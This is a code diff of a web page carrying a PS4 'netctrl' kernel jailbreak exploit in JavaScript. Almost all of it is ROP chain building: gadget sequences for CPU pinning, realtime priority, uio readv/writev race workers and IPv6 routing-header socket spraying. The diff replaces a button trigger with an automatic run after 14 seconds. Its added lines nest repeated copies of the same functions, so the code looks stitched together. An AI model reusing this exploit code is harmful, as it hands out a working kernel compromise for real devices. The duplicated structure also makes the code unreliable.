-            rop.push(new BigInt(0,3));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(BigInt_Error);
-            rop.push(gadgets.POP_RCX_RET);
-            rop.push(new BigInt(0,0x10));
-            rop.push(gadgets.POP_R8_RET);
-            rop.push(cpu_mask);
-            rop.push(cpuset_setaffinity_wrapper);
-            var rtprio_buf = malloc(4);
-            write16(rtprio_buf, PRI_REALTIME);
-            write16(rtprio_buf.add(2), MAIN_RTPRIO);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(new BigInt(0,0));
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(rtprio_buf);
-            rop.push(rtprio_thread_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(ready_signal);
-            rop.push(gadgets.POP_RAX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-            var loop_init = rop.length;
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(run_fd);
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(signal_buf);
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(read_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,uio_sock_1));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(uioIovRead);
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(new BigInt(0,UIO_IOV_NUM));
-            rop.push(writev_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(done_signal);
-            rop.push(gadgets.POP_RAX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-            var loop_end = rop.length;
-            var loop_size = loop_end - loop_init;
-
-            return { rop: rop, loop_size: loop_size };
-        }
-
-        function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
-            var rop = [];
-            rop.push(new BigInt(0,0));
-
-            var cpu_mask = malloc(0x10);
-            write16(cpu_mask, 1 << MAIN_CORE);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,3));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(BigInt_Error);
-            rop.push(gadgets.POP_RCX_RET);
-            rop.push(new BigInt(0,0x10));
-            rop.push(gadgets.POP_R8_RET);
-            rop.push(cpu_mask);
-            rop.push(cpuset_setaffinity_wrapper);
-            var rtprio_buf = malloc(4);
-            write16(rtprio_buf, PRI_REALTIME);
-            write16(rtprio_buf.add(2), MAIN_RTPRIO);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(new BigInt(0,0));
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(rtprio_buf);
-            rop.push(rtprio_thread_wrapper);
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(ready_signal);
-            rop.push(gadgets.POP_RAX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
-            var loop_init = rop.length;
-
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(run_fd);
-            rop.push(gadgets.POP_RSI_RET);
-            rop.push(signal_buf);
-            rop.push(gadgets.POP_RDX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(read_wrapper);
-
-            var i;
-            for (i = 0; i < ipv6_socks.length; i++) {
                 rop.push(gadgets.POP_RDI_RET);
-                rop.push(ipv6_socks[i]);
+                rop.push(new BigInt(0,3));
                 rop.push(gadgets.POP_RSI_RET);
-                rop.push(new BigInt(0,IPPROTO_IPV6));
+                rop.push(new BigInt(0,1));
                 rop.push(gadgets.POP_RDX_RET);
-                rop.push(new BigInt(0,IPV6_RTHDR));
+                rop.push(BigInt_Error);
                 rop.push(gadgets.POP_RCX_RET);
-                rop.push(spray_rthdr_rop.add(i * UCRED_SIZE));
+                rop.push(new BigInt(0,0x10));
                 rop.push(gadgets.POP_R8_RET);
-                rop.push(new BigInt(0,spray_rthdr_len));
-                rop.push(setsockopt_wrapper);
-            }
+                rop.push(cpu_mask);
+                rop.push(cpuset_setaffinity_wrapper);
+                var rtprio_buf = malloc(4);
+                write16(rtprio_buf, PRI_REALTIME);
+                write16(rtprio_buf.add(2), MAIN_RTPRIO);
 
-            for (i = 0; i < ipv6_socks.length; i++) {
                 rop.push(gadgets.POP_RDI_RET);
-                rop.push(ipv6_socks[i]);
+                rop.push(new BigInt(0,1));
                 rop.push(gadgets.POP_RSI_RET);
-                rop.push(new BigInt(0,IPPROTO_IPV6));
+                rop.push(new BigInt(0,0));
                 rop.push(gadgets.POP_RDX_RET);
-                rop.push(new BigInt(0,IPV6_RTHDR));
+                rop.push(rtprio_buf);
+                rop.push(rtprio_thread_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(ready_signal);
+                rop.push(gadgets.POP_RAX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+                var loop_init = rop.length;
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(run_fd);
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(signal_buf);
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(read_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,iov_sock_0));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(msg);
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(new BigInt(0,0));
+                rop.push(recvmsg_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(done_signal);
+                rop.push(gadgets.POP_RAX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+                var loop_end = rop.length;
+                var loop_size = loop_end - loop_init;
+
+                return { rop: rop, loop_size: loop_size };
+            }
+
+            function uio_readv_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
+                var rop = [];
+                rop.push(new BigInt(0,0));
+
+                var cpu_mask = malloc(0x10);
+                write16(cpu_mask, 1 << MAIN_CORE);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,3));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(BigInt_Error);
                 rop.push(gadgets.POP_RCX_RET);
-                rop.push(read_rthdr_rop.add(i * 8));
+                rop.push(new BigInt(0,0x10));
                 rop.push(gadgets.POP_R8_RET);
-                rop.push(check_len);
-                rop.push(getsockopt_wrapper);
+                rop.push(cpu_mask);
+                rop.push(cpuset_setaffinity_wrapper);
+                var rtprio_buf = malloc(4);
+                write16(rtprio_buf, PRI_REALTIME);
+                write16(rtprio_buf.add(2), MAIN_RTPRIO);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(new BigInt(0,0));
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(rtprio_buf);
+                rop.push(rtprio_thread_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(ready_signal);
+                rop.push(gadgets.POP_RAX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+                var loop_init = rop.length;
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(run_fd);
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(signal_buf);
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(read_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,uio_sock_0));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(uioIovWrite);
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(new BigInt(0,UIO_IOV_NUM));
+                rop.push(readv_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(done_signal);
+                rop.push(gadgets.POP_RAX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+                var loop_end = rop.length;
+                var loop_size = loop_end - loop_init;
+
+                return { rop: rop, loop_size: loop_size };
             }
 
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(done_signal);
-            rop.push(gadgets.POP_RAX_RET);
-            rop.push(new BigInt(0,1));
-            rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+            function uio_writev_worker_rop(ready_signal, run_fd, done_signal, signal_buf) {
+                var rop = [];
+                rop.push(new BigInt(0,0));
 
-            rop.push(gadgets.POP_RDI_RET);
-            rop.push(new BigInt(0,0));
-            rop.push(thr_exit_wrapper);
+                var cpu_mask = malloc(0x10);
+                write16(cpu_mask, 1 << MAIN_CORE);
 
-            return { rop: rop, loop_size: 0 };
-        }
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,3));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(BigInt_Error);
+                rop.push(gadgets.POP_RCX_RET);
+                rop.push(new BigInt(0,0x10));
+                rop.push(gadgets.POP_R8_RET);
+                rop.push(cpu_mask);
+                rop.push(cpuset_setaffinity_wrapper);
+                var rtprio_buf = malloc(4);
+                write16(rtprio_buf, PRI_REALTIME);
+                write16(rtprio_buf.add(2), MAIN_RTPRIO);
 
-        // Button handler
-        document.getElementById('triggerBtn').addEventListener('click', function() {
-            log('Starting netctrl exploit (PS4‑compatible)');
-            try {
-                netctrl_exploit();
-            } catch (e) {
-                log('Exploit error: ' + e.message);
-                console.error(e);
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(new BigInt(0,0));
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(rtprio_buf);
+                rop.push(rtprio_thread_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(ready_signal);
+                rop.push(gadgets.POP_RAX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+                var loop_init = rop.length;
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(run_fd);
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(signal_buf);
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(read_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,uio_sock_1));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(uioIovRead);
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(new BigInt(0,UIO_IOV_NUM));
+                rop.push(writev_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(done_signal);
+                rop.push(gadgets.POP_RAX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+                var loop_end = rop.length;
+                var loop_size = loop_end - loop_init;
+
+                return { rop: rop, loop_size: loop_size };
             }
-        });
 
-        log('Page loaded. Click the big button to begin.');
+            function ipv6_sock_spray_and_read_rop(ready_signal, run_fd, done_signal, signal_buf) {
+                var rop = [];
+                rop.push(new BigInt(0,0));
+
+                var cpu_mask = malloc(0x10);
+                write16(cpu_mask, 1 << MAIN_CORE);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,3));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(BigInt_Error);
+                rop.push(gadgets.POP_RCX_RET);
+                rop.push(new BigInt(0,0x10));
+                rop.push(gadgets.POP_R8_RET);
+                rop.push(cpu_mask);
+                rop.push(cpuset_setaffinity_wrapper);
+                var rtprio_buf = malloc(4);
+                write16(rtprio_buf, PRI_REALTIME);
+                write16(rtprio_buf.add(2), MAIN_RTPRIO);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(new BigInt(0,0));
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(rtprio_buf);
+                rop.push(rtprio_thread_wrapper);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(ready_signal);
+                rop.push(gadgets.POP_RAX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+                var loop_init = rop.length;
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(run_fd);
+                rop.push(gadgets.POP_RSI_RET);
+                rop.push(signal_buf);
+                rop.push(gadgets.POP_RDX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(read_wrapper);
+
+                var i;
+                for (i = 0; i < ipv6_socks.length; i++) {
+                    rop.push(gadgets.POP_RDI_RET);
+                    rop.push(ipv6_socks[i]);
+                    rop.push(gadgets.POP_RSI_RET);
+                    rop.push(new BigInt(0,IPPROTO_IPV6));
+                    rop.push(gadgets.POP_RDX_RET);
+                    rop.push(new BigInt(0,IPV6_RTHDR));
+                    rop.push(gadgets.POP_RCX_RET);
+                    rop.push(spray_rthdr_rop.add(i * UCRED_SIZE));
+                    rop.push(gadgets.POP_R8_RET);
+                    rop.push(new BigInt(0,spray_rthdr_len));
+                    rop.push(setsockopt_wrapper);
+                }
+
+                for (i = 0; i < ipv6_socks.length; i++) {
+                    rop.push(gadgets.POP_RDI_RET);
+                    rop.push(ipv6_socks[i]);
+                    rop.push(gadgets.POP_RSI_RET);
+                    rop.push(new BigInt(0,IPPROTO_IPV6));
+                    rop.push(gadgets.POP_RDX_RET);
+                    rop.push(new BigInt(0,IPV6_RTHDR));
+                    rop.push(gadgets.POP_RCX_RET);
+                    rop.push(read_rthdr_rop.add(i * 8));
+                    rop.push(gadgets.POP_R8_RET);
+                    rop.push(check_len);
+                    rop.push(getsockopt_wrapper);
+                }
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(done_signal);
+                rop.push(gadgets.POP_RAX_RET);
+                rop.push(new BigInt(0,1));
+                rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);
+
+                rop.push(gadgets.POP_RDI_RET);
+                rop.push(new BigInt(0,0));
+                rop.push(thr_exit_wrapper);
+
+                return { rop: rop, loop_size: 0 };
+            }
+
+            // Expose netctrl_exploit globally so the timer can call it
+            window.netctrl_exploit = netctrl_exploit;
+
+            // Start netctrl automatically after 14 seconds
+            setTimeout(function() {
+                log('14 seconds elapsed – starting netctrl jailbreak...');
+                try {
+                    netctrl_exploit();
+                } catch (e) {
+                    log('netctrl error: ' + e.message);
+                }
+            }, 14000);
+        })();
     </script>
 </body>
 </html>
